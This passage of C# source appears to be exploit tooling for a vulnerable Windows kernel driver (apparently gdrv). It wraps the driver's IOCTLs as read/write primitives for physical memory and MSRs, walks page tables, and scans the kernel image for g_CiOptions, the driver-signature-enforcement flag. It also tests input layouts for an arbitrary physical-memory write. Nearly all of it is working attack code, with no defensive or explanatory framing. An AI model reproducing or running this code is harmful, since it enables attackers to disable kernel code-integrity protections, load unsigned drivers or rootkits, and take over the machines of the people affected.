        hits += "  reads=" + reads + "\r\n";
        return vaBase == 0 ? "" : "1";
    }

    // ---- X4: nt!g_CiOptions ------------------------------------------------
    // Not exported: the only `mov dword [rip+disp32], IMM` whose target holds
    // IMM right now (0x0E/0x06 = DSE on).  Self-consistency is the filter.
    public static string FindCiOptions(IntPtr g, ulong cr3, ulong vaBase, ulong physBase,
                                       uint sizeOfImage, out string report)
    {
        report = "";
        int found = 0;
        for (uint off = 0; off + 0x1000 <= sizeOfImage; off += 0x1000)
        {
            byte[] b;
            try { b = GdrvRead(g, physBase + off, 0x1000); }
            catch (Exception) { continue; }
            for (int i = 0; i + 10 <= 0x1000; i++)
            {
                if (b[i] != 0xC7 || b[i + 1] != 0x05) continue;
                uint imm = BitConverter.ToUInt32(b, i + 6);
                if (imm != 0x0E && imm != 0x06 && imm != 0x02 && imm != 0x0D) continue;
                int disp = BitConverter.ToInt32(b, i + 2);
                ulong instrVa = vaBase + off + (ulong)i;
                ulong targetVa = instrVa + 7 + (ulong)(long)disp;
                ulong tpa;
                if (!Walk(g, cr3, targetVa, out tpa)) continue;
                uint cur = RdD(g, tpa);
                string tag = (cur == imm) ? "  <== SELF-CONSISTENT" : "";
                report += string.Format("  instrVa=0x{0:x} writes=0x{1:x2} -> targetVa=0x{2:x} targetPa=0x{3:x} current=0x{4:x8}{5}\r\n",
                                        instrVa, imm, targetVa, tpa, cur, tag);
                found++;
                if (found >= 24) return found.ToString();
            }
        }
        return found.ToString();
    }

    // ========================================================================
    // W: write-primitive matrix.  Every call below is the exact dll contract:
    // 24-byte in-struct, lpOutBuffer=NULL, nOutBuffer=0, capture the in-struct
    // afterwards (the workers write results back into it).
    // ========================================================================
    public static bool Io2014(IntPtr g, ulong q0, uint size, ulong q3, out uint got, out uint err)
    {
        IntPtr inb = Marshal.AllocHGlobal(0x18);
        try
        {
            Marshal.WriteInt64(inb, 0x00, (long)q0);
            Marshal.WriteInt32(inb, 0x08, (int)size);
            Marshal.WriteInt32(inb, 0x0C, 0);
            Marshal.WriteInt64(inb, 0x10, (long)q3);
            bool ok = DeviceIoControl(g, 0xC3502014, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            return ok;
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    // 0x2019 MapMem_Phys_To_Linear2: {pa, size, 0, dst}; the kva comes back in
    // the dst buffer and/or the in-struct, so both are captured.
    public static bool Io2019(IntPtr g, ulong pa, uint size, IntPtr dst, out ulong q0After,
                              out ulong q3After, out string dstHex, out uint got, out uint err)
    {
        q0After = 0; q3After = 0; dstHex = "";
        IntPtr inb = Marshal.AllocHGlobal(0x18);
        try
        {
            Marshal.WriteInt64(inb, 0x00, (long)pa);
            Marshal.WriteInt32(inb, 0x08, (int)size);
            Marshal.WriteInt32(inb, 0x0C, 0);
            Marshal.WriteInt64(inb, 0x10, dst.ToInt64());
            bool ok = DeviceIoControl(g, 0xC3502019, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            q0After = (ulong)Marshal.ReadInt64(inb, 0x00);
            q3After = (ulong)Marshal.ReadInt64(inb, 0x10);
            byte[] d = new byte[0x20];
            Marshal.Copy(dst, d, 0, 0x20);
            dstHex = Hex(d);
            return ok;
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    // 0x2800 alloc: in {u32 size}, out 0x10 {u64 va, u64 pa}
    public static bool Io2800(IntPtr g, uint size, out ulong q0, out ulong q1, out uint got, out uint err)
    {
        q0 = 0; q1 = 0;
        IntPtr inb = Marshal.AllocHGlobal(0x10);
        IntPtr outb = Marshal.AllocHGlobal(0x10);
        try
        {
            Marshal.WriteInt32(inb, 0, (int)size);
            Marshal.WriteInt64(outb, 0); Marshal.WriteInt64(outb, 8, 0);
            bool ok = DeviceIoControl(g, 0xC3502800, inb, 4, outb, 0x10, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            q0 = (ulong)Marshal.ReadInt64(outb, 0);
            q1 = (ulong)Marshal.ReadInt64(outb, 8);
            return ok;
        }
        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(outb); }
    }

    // 0x2804 free: in {u64 va} (dll passes inLen 8)
    public static bool Io2804(IntPtr g, ulong va, out uint got, out uint err)
    {
        IntPtr inb = Marshal.AllocHGlobal(0x10);
        try
        {
            Marshal.WriteInt64(inb, 0, (long)va);
            Marshal.WriteInt64(inb, 8, 0);
            bool ok = DeviceIoControl(g, 0xC3502804, inb, 8, IntPtr.Zero, 0, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            return ok;
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    // 0x2808 Copy_Userbuf_To_Phys: wrapper packs (b, a, n) as {u64,u64,u32,pad}
    public static bool Io2808(IntPtr g, ulong a, ulong b, uint n, out uint got, out uint err)
    {
        IntPtr inb = Marshal.AllocHGlobal(0x18);
        try
        {
            Marshal.WriteInt64(inb, 0, (long)b);
            Marshal.WriteInt64(inb, 8, (long)a);
            Marshal.WriteInt32(inb, 0x10, (int)n);
            Marshal.WriteInt32(inb, 0x14, 0);
            bool ok = DeviceIoControl(g, 0xC3502808, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            return ok;
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    // 0x2580 read MSR: in 0x20 {u32 index}, out 0x20
    public static bool IoMsrRead(IntPtr g, uint idx, out ulong q0, out ulong q1,
                                 out string inHex, out string outHex, out uint got, out uint err)
    {
        q0 = 0; q1 = 0; inHex = ""; outHex = "";
        IntPtr inb = Marshal.AllocHGlobal(0x20);
        IntPtr outb = Marshal.AllocHGlobal(0x20);
        try
        {
            for (int i = 0; i < 0x20; i++) { Marshal.WriteByte(inb, i, 0); Marshal.WriteByte(outb, i, 0); }
            Marshal.WriteInt32(inb, 0, (int)idx);
            bool ok = DeviceIoControl(g, 0xC3502580, inb, 0x20, outb, 0x20, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            byte[] ib = new byte[0x20]; Marshal.Copy(inb, ib, 0, 0x20); inHex = Hex(ib);
            byte[] ob = new byte[0x20]; Marshal.Copy(outb, ob, 0, 0x20); outHex = Hex(ob);
            q0 = (ulong)Marshal.ReadInt64(outb, 0);
            q1 = (ulong)Marshal.ReadInt64(outb, 8);
            return ok;
        }
        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(outb); }
    }

    // 0x2584 write MSR: same 0x20/0x20 shape, value at +8
    public static bool IoMsrWrite(IntPtr g, uint idx, ulong val, out uint got, out uint err)
    {
        IntPtr inb = Marshal.AllocHGlobal(0x20);
        IntPtr outb = Marshal.AllocHGlobal(0x20);
        try
        {
            for (int i = 0; i < 0x20; i++) { Marshal.WriteByte(inb, i, 0); Marshal.WriteByte(outb, i, 0); }
            Marshal.WriteInt32(inb, 0, (int)idx);
            Marshal.WriteInt64(inb, 8, (long)val);
            bool ok = DeviceIoControl(g, 0xC3502584, inb, 0x20, outb, 0x20, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            return ok;
        }
        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(outb); }
    }

    // ---- W matrix on a verified page ---------------------------------------
    // perm 0: {pa, size, 0, src}  (the read orientation - control)
    // perm 1: {srcVa, size, 0, paVa} (roles swapped: q0 read as the PA)
    // perm 2: {pa, size, 1, src}  (pad=1 as a write flag)
    // perm 3: {srcVa, size, 1, paVa}
    // perm 4: {pa, 0x10, 1, src}  (MSR-style 16-byte write)
    // paVa = a valid user VA whose low 32 bits equal pa (the driver probe).
    // Every perm returns; the caller compares pa's content against the pattern.
    public static string IoPerm(IntPtr g, int perm, ulong pa, ulong paVa, IntPtr src, uint size,
                                out uint got, out uint err)
    {
        got = 0; err = 0;
        switch (perm)
        {
            case 1: return (Io2014(g, (ulong)src.ToInt64(), size, paVa, out got, out err) ? "OK" : "FAIL") + " err=" + err;
            case 2: return (IoRaw(g, 0xC3502014, pa, size, 1, (ulong)src.ToInt64(), out got, out err) ? "OK" : "FAIL") + " err=" + err;
            case 3: return (IoRaw(g, 0xC3502014, (ulong)src.ToInt64(), size, 1, paVa, out got, out err) ? "OK" : "FAIL") + " err=" + err;
            case 4: return (IoRaw(g, 0xC3502014, pa, 0x10, 1, (ulong)src.ToInt64(), out got, out err) ? "OK" : "FAIL") + " err=" + err;
            default: return (Io2014(g, pa, size, (ulong)src.ToInt64(), out got, out err) ? "OK" : "FAIL") + " err=" + err;
        }
    }

    static bool IoRaw(IntPtr g, uint code, ulong q0, uint size, uint pad, ulong q3, out uint got, out uint err)
    {
        IntPtr inb = Marshal.AllocHGlobal(0x18);
        try
        {
            Marshal.WriteInt64(inb, 0x00, (long)q0);
            Marshal.WriteInt32(inb, 0x08, (int)size);
            Marshal.WriteInt32(inb, 0x0C, (int)pad);
            Marshal.WriteInt64(inb, 0x10, (long)q3);
            bool ok = DeviceIoControl(g, code, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero);
            err = (uint)Marshal.GetLastWin32Error();
            return ok;
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    public static string ReadPhysHex(IntPtr g, ulong pa, int n)
    {
        try { return Hex(GdrvRead(g, pa, n)); } catch (Exception e) { return "err:" + e.Message; }
    }

    // ---- user page helpers (fixed VA so q0/q3 stay plausible in every role) --
    public static IntPtr PageAlloc(ulong fixedBase)
    {
        IntPtr p = VirtualAlloc(new IntPtr((long)fixedBase), new IntPtr(0x1000),
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (p != IntPtr.Zero) VirtualLock(p, new IntPtr(0x1000));
        return p;
    }

    public static void PageFree(IntPtr p)
    {
        if (p == IntPtr.Zero) return;
        VirtualUnlock(p, new IntPtr(0x1000));
        VirtualFree(p, IntPtr.Zero, MEM_RELEASE);
    }

    public static void MemZero(IntPtr p, int n)
    {
        for (int i = 0; i < n; i++) Marshal.WriteByte(p, i, 0);
    }

    public static void MemFill(IntPtr p, int n, byte seed)
    {
        for (int i = 0; i < n; i++) Marshal.WriteByte(p, i, (byte)(seed + i * 7));
    }

    public static byte[] MemRead(IntPtr p, int n)
    {
        byte[] b = new byte[n];
        Marshal.Copy(p, b, 0, n);
        return b;
    }

    public static bool BytesEqual(byte[] a, byte[] b, int n)
    {
        if (a == null || b == null || a.Length < n || b.Length < n) return false;
        for (int i = 0; i < n; i++) if (a[i] != b[i]) return false;
        return true;
    }

    public static bool CloseHandle2(IntPtr h) { return CloseHandle(h); }
}
